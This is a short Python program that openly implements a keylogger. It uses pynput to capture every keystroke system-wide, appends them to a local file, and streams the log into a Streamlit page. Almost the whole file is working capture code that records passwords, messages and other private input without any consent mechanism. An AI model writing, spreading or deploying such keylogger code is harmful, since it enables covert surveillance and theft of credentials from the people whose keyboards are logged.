import pynput
from pynput.keyboard import Key, Listener
import streamlit as st
import threading
import time

# File to log the keystrokes
log_file = "key_log.txt"
# Function to write keystrokes to the log file
def write_to_file(key):
    with open(log_file, "a") as f:
        key_str = str(key).replace("'", "")
        if key == Key.space:
            f.write(' ')
        elif key == Key.enter:
            f.write('\n')
        elif key == Key.tab:
            f.write('\t')
        elif key == Key.backspace:
            f.write(' [BACKSPACE] ')
        elif key == Key.esc:
            f.write(' [ESC] ')
        else:
            f.write(key_str)

# Function to handle key press events
def on_press(key):
    write_to_file(key)

# Function to handle key release events (optional)
def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Function to start the keylogger
def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Function to read the log file
def read_log_file():
    with open(log_file, "r") as f:
        return f.read()

# Streamlit interface setup
def run_streamlit():
    st.title("Keylogger with Streamlit")
    st.write("Logging keystrokes...")

    # Start the keylogger in a separate thread
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.start()

    # Continuously update the log content in the Streamlit interface
    while True:
        # Display the log file content
        log_content = read_log_file()
        st.text_area("Keystroke Log", log_content, height=400)
        time.sleep(1)
        st.experimental_rerun()

# Run the Streamlit interface
if __name__ == "__main__":
    run_streamlit()



